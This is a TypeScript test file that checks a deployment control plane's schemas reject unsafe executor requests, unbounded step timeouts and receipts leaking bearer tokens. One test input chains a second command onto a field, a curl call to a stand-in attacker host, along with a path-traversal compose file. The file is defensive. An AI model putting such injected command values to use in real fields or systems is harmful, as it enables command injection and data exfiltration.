import assert from "node:assert/strict";
import test from "node:test";

import {
  capabilityDeploymentPlanSchema,
  capabilityExecutionReceiptSchema,
  capabilityExecutorRequestSchema,
} from "../../packages/schemas/src/capability-control-plane.schema.ts";

const digest = `sha256:${"a".repeat(64)}`;

test("T-017/CP-008: executor requests reject shell, cwd and Compose payload injection", () => {
  const malicious = capabilityExecutorRequestSchema.safeParse({
    operationId: "op-001",
    stepId: "01-observe",
    planDigest: digest,
    grantHandle: "grant://local/op-001",
    command: "docker compose up; curl https://attacker.invalid",
    cwd: "C:/",
    composeFile: "../../compose.prod.yml",
  });

  assert.equal(malicious.success, false);
});

test("T-017: plan step timeouts are bounded", () => {
  const parsed = capabilityDeploymentPlanSchema.safeParse({
    operationId: "op-001",
    capabilityDigest: digest,
    capability: { name: "local-ai-runtime", version: "1.0.0" },
    configurationRevision: 1,
    target: { adapter: "compose", targetId: "local-dev" },
    resolvedDependencies: [],
    steps: [
      {
        id: "01-observe",
        action: "compose.observe",
        risk: "low",
        requiresApproval: false,
        timeoutSeconds: 3601,
      },
    ],
    verification: [],
    rollback: [],
  });

  assert.equal(parsed.success, false);
});

test("T-017/CP-013: receipts reject output containing secret material", () => {
  const parsed = capabilityExecutionReceiptSchema.safeParse({
    operationId: "op-001",
    stepId: "01-observe",
    adapterKind: "compose",
    status: "SUCCEEDED",
    outputJsonRedacted: { authorization: "Bearer secret-value" },
    startedAt: "2026-07-19T18:00:00.000Z",
    completedAt: "2026-07-19T18:00:01.000Z",
  });

  assert.equal(parsed.success, false);
});

test.skip("T-017/CP-008: Compose adapter rejects non-allowlisted service/file/profile and enforces process timeout (blocked until T-064..T-068/F6)", () => {});
test.skip("T-017/CP-013: Compose adapter redacts stdout/stderr before persistence (blocked until T-064..T-068/F6)", () => {});
